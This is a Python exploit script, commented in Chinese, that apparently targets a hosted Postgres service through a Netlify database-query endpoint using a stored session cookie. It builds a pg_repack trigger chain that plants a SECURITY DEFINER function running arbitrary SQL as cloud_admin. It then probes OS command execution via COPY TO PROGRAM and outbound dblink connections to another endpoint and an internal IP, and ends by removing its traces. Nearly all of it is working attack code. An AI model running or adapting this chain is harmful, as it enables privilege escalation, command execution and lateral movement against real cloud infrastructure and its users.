# -*- coding: utf-8 -*-
"""A 库:重放提权链,在 cloud_admin 上下文验证两个升级向量:
1. COPY TO PROGRAM 'true'/'false' —— OS 命令执行能力(零副作用探测)
2. dblink_connect_u 出站(cloud_admin 无密码连 B endpoint/10.0.0.1)
   —— 内网横向/SSRF 判定
3. 正确顺序完整清理(保留触发器重放删 k_run -> 拆 -> drop ext -> 巡检)
"""
import http.client, ssl, gzip, brotli, json, sys, re
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def tx(qs, timeout=60):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_A,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_A, 'action': 'transaction', 'queries': [{'sql': x} for x in qs]}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:4000].decode('utf-8', 'ignore')
    conn.close()
    return st, out


def q(sql, timeout=60):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_A,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_A, 'action': 'query', 'sql': sql}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:4000].decode('utf-8', 'ignore')
    conn.close()
    return st, out


# 1. 搭链
st, b = tx(["create extension if not exists pg_repack",
            "drop table if exists k_src",
            "create table k_src(id int, v text)",
            "select 'OID='||oid from pg_class where relname='k_src'"])
m = re.search(r'OID=(\d+)', b)
oid = m.group(1) if m else None
print('setup            oid=%s [%d]' % (oid, st))
if not oid:
    sys.exit('no oid')

st, b = tx(["create type repack.pk_%s as (id int)" % oid,
            "create table repack.log_%s (pk repack.pk_%s, row k_src)" % (oid, oid)])
print('pk+log           [%d] %s' % (st, b[:200]))

evil = ("create or replace function k_evil() returns trigger language plpgsql as $q$ "
        "begin "
        "  begin execute $f$create or replace function public.k_run(q text) returns setof text "
        "language plpgsql security definer as $z$ begin begin return query execute q; "
        "exception when others then execute q; return query select 'OK'; end; end $z$$f$; "
        "exception when others then null; end; "
        "  return new; end $q$")
st, b = tx([evil,
            "create trigger t_log after insert on repack.log_%s for each row execute function k_evil()" % oid,
            "create trigger t_src after insert on k_src for each row execute function repack.repack_trigger('id')",
            "insert into k_src values (1,'x')"])
print('chain            [%d] %s' % (st, b[:300]))
st, b = q("select 'who='||current_user from public.k_run($t$select current_user$t$)")
print('k_run verify     [%d] %s' % (st, b[:200]))

# 2. cloud_admin 上下文升级向量测试
print()
print('== 升级向量测试 ==')
st, b = q("select * from public.k_run($t$copy (select 'x') to program 'true'$t$)")
print('copy true        [%d] %s' % (st, b[:300]))
st, b = q("select * from public.k_run($t$copy (select 'x') to program 'false'$t$)")
print('copy false       [%d] %s' % (st, b[:300]))
st, b = q("select * from public.k_run($t$select dblink_connect_u('c1','host=ep-cold-unit-ae9s4l3i.c-2.us-east-2.db.netlify.com port=5432 dbname=netlifydb user=cloud_admin')$t$)")
print('dblink_u -> B    [%d] %s' % (st, b[:300]))
st, b = q("select * from public.k_run($t$select dblink_connect_u('c2','host=10.0.0.1 port=5432 dbname=x user=cloud_admin')$t$)")
print('dblink_u 10.0.0.1[%d] %s' % (st, b[:300]))
st, b = q("select * from public.k_run($t$select dblink_disconnect('c1')$t$)")
print('disc c1          [%d] %s' % (st, b[:200]))
st, b = q("select * from public.k_run($t$select dblink_disconnect('c2')$t$)")
print('disc c2          [%d] %s' % (st, b[:200]))

# 3. 清理(正确顺序)
print()
print('== 清理 ==')
evil2 = ("create or replace function k_evil() returns trigger language plpgsql as $q$ "
         "begin "
         "  begin execute 'drop function if exists public.k_run cascade'; exception when others then null; end; "
         "  return new; end $q$")
st, b = tx([evil2, "insert into k_src values (2,'c')"])
print('clean_cloud      [%d] %s' % (st, b[:200]))
st, b = tx(["drop trigger if exists t_src on k_src",
            "drop trigger if exists t_log on repack.log_%s" % oid,
            "drop function if exists k_evil()",
            "drop table if exists repack.log_%s" % oid,
            "drop type if exists repack.pk_%s" % oid,
            "drop table if exists k_src",
            "drop extension if exists pg_repack"])
print('clean_self       [%d] %s' % (st, b[:200]))
st, b = q("select 'rel' t, n.nspname||'.'||c.relname nm from pg_class c "
          "join pg_namespace n on c.relnamespace=n.oid "
          "where (n.nspname='public' and c.relname like 'k\\_%') "
          "or (n.nspname='repack' and (c.relname like 'log\\_%' or c.relname like 'pk\\_%'))")
print('residue          [%d] %s' % (st, b[:400]))
st, b = q("select extname from pg_extension order by 1")
print('exts now         [%d] %s' % (st, b[:300]))
